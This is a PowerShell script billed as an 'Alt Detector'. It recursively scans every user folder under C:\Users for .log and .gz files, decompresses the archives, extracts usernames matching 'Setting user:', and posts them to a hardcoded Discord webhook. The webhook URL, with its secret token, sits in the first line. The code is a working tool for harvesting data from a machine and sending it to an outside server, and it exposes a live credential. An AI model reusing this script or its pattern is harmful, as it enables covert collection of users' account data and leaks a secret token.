$webhookUrl = "https://discord.com/api/webhooks/1484660761065164941/zLCj9R1yBHopZUV9UflUrB_NS-aWOy9_DOcjB1-Djan2iHoXSyPaZCcCh9pZPMfG9UmN"
$startPath = "C:\Users"

if (-not (Test-Path $startPath)) {
    exit
}

Write-Host "Finding usernames, It may take a few minutes..." -ForegroundColor Cyan

$gzFiles = Get-ChildItem -Path $startPath -Recurse -Filter "*.gz" -File -Force -ErrorAction SilentlyContinue
$logFiles = Get-ChildItem -Path $startPath -Recurse -Filter "*.log" -File -Force -ErrorAction SilentlyContinue
$allFiles = @($gzFiles) + @($logFiles)

$results = @()

foreach ($file in $allFiles) {
    try {
        $content = $null
        $isGz = $file.Extension -eq ".gz"
        
        if ($isGz) {
            $tempFileName = "$($file.BaseName)_temp_$([guid]::NewGuid().ToString('N')).txt"
            $tempOutput = Join-Path $file.DirectoryName $tempFileName
            
            $inputStream = [System.IO.File]::OpenRead($file.FullName)
            $outputStream = [System.IO.File]::Create($tempOutput)
            $gzipStream = New-Object System.IO.Compression.GZipStream($inputStream, [System.IO.Compression.CompressionMode]::Decompress)
            
            $gzipStream.CopyTo($outputStream)
            
            $gzipStream.Close()
            $outputStream.Close()
            $inputStream.Close()
            
            $content = Get-Content $tempOutput -Raw -ErrorAction SilentlyContinue
            Remove-Item $tempOutput -Force -ErrorAction SilentlyContinue
        } else {
            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
        }
        
        $pattern = "Setting user:\s*(\S+)"
        if ($content -and $content -match $pattern) {
            $results += [PSCustomObject]@{
                "Usernames" = $Matches[1]
                "Path" = $file.FullName
            }
        }
    }
    catch {
        continue
    }
}

# Display results in console (without paths)
if ($results.Count -gt 0) {
    Write-Host "`nFound usernames:" -ForegroundColor Cyan
    $results | ForEach-Object {
        Write-Host ("  {0}" -f $_.Usernames) -ForegroundColor Magenta
    }
    
    # Send to Discord (usernames only)
    $uniqueUsernames = $results | Select-Object -ExpandProperty Usernames | Select-Object -Unique
    $message = "**ALTS DETECTED**`n`n"
    foreach ($username in $uniqueUsernames) {
        $message += "`"$username`"`n"
    }
    
    $payload = @{
        content = $message
        username = "Alt Detector"
    } | ConvertTo-Json
    
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
        Write-Host "`nResults sent to Discord!" -ForegroundColor Green
    }
    catch {
        Write-Host "`nFailed to send to Discord: $_" -ForegroundColor Red
    }
} else {
    Write-Host "No usernames found." -ForegroundColor Yellow
    $payload = @{
        content = "**ALTS DETECTED**`n`nNo alt accounts detected"
        username = "Alt Detector"
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
}
